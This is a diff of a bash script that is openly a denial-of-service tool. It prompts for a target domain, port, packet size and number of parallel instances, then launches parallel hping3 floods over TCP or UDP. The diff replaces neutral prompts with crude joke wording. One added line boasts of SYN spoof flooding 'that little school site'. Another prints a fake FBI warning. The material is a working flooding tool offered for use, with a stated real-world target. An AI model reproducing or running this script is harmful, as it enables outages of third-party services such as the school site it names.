@@ -1,24 +1,28 @@
 cat warning.txt
 echo ""
-read -p "Do you accept the terms in the README? [Y/N]: " confirm
+read -p "Do you accept the terms to no go to ma ball? [Y/N]: " confirm
 confirm=$(echo "$confirm" | tr '[:upper:]' '[:lower:]')
 
 if [[ "$confirm" != "y" ]]; then
-    echo "Aborted."
+    echo "U ar ok to go buddy."
     exit 1
 fi
 
-read -p "Domain to attack: " domain
-read -p "Request size: " size
-read -p "Win size: " win
-read -p "Port to attack: " port
-read -p "Number of parallel instances: " instances
-read -p "Duration of attack (in seconds): " duration
+read -p "What domen shuld i kill: " domain
+echo "How Hard Should I Be With Ma...
+sleep 2
+read -p "Oh Wrong Text i Mean The Size Of Request: " size
+read -p "Window Size Me. What Window Size?: " win
+read -p "Port I Need To Shoot At " port
+read -p "How Many Of Me Should Pee That Site: " instances
+read -p "How Many Secconds Should I Pee There For: " duration
 
-echo "TCP attack"
-echo "UDP attack"
+echo "TCP pooping"
+echo "UDP peeing"
 read -p "<T/U> " tu
 tu=$(echo "$tu" | tr '[:lower:]' '[:upper:]')
+
+echo I Use Syn Spoof Flooding To Leave Open Connections On That Little School Site So It Freaks Out Some Fire But If Your IT Is Not Useless The You Just Need To Say Me Pee no Poop.
 
 sudo nft add table arp filter 2>/dev/null || true
 sudo nft add chain arp filter output '{ type filter hook output priority 0; }' 2>/dev/null || true
@@ -33,12 +37,12 @@ else
     sudo nft delete table arp filter 2>/dev/null || true
     exit 1
 fi
-
+echo "Doing The Shit"
 (
-    yes "$attack_cmd" | head -n "$instances" | parallel -j"$instances" --no-notice &
+    out=$(yes "$attack_cmd" | head -n "$instances" | parallel -j"$instances" --no-notice --tag bash -c '"{}" 2>&1 | grep "packets transmitted"')
     flood_pid=$!
     sleep "$duration"
-    echo "Time's up — stopping attack..."
+    echo "Out Of Pee And Poop, Killing Finished"
     sudo pkill -f hping3
     sudo pkill -f "bash -c"
     wait $flood_pid 2>/dev/null
@@ -48,5 +52,12 @@ wait
 
 sudo nft delete table arp filter 2>/dev/null || true
 
-echo -e "\n\033[1;32mAttack completed. All processes stopped after $duration seconds.\033[0m"
-read -p "Press Enter to exit." finish
+echo -e "\033[1;31mALERT: Unauthorized access detected.\033[0m"
+sleep 1
+echo "This incident will be reported to the Federal Bureau of Investigation."
+sleep 3
+echo -e "\033[1;33mjk, calm down — unless you actually messed up and made some real shit\033[0m"
+sleep 5
+echo "bruh they are coming hide me"
+read -rp "Press Enter To Hide Me." hide
+
